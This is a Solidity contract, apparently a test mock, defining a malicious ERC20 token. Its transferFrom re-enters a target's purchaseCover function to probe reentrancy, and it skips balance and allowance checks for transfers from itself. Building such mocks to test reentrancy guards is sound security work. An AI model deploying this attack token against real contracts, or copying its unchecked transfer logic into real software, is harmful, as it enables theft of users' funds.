// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IPurchaseHook {
    function purchaseCover(uint256 poolId, uint256 coverage, uint256 amount) external returns (uint256);
}

contract MaliciousERC20Reentrant is ERC20 {
    IPurchaseHook public pm;
    uint256 public poolId;
    uint256 public coverage;
    uint256 public deposit;
    bool public attack;

    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}

    function setAttack(address _pm, uint256 _poolId, uint256 _coverage, uint256 _deposit) external {
        pm = IPurchaseHook(_pm);
        poolId = _poolId;
        coverage = _coverage;
        deposit = _deposit;
        attack = true;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        if (attack) {
            attack = false;
            pm.purchaseCover(poolId, coverage, deposit);
        }
        if (from == address(this)) {
            // Skip balance/allowance checks when transferring from self
            return true;
        }
        return super.transferFrom(from, to, amount);
    }
}
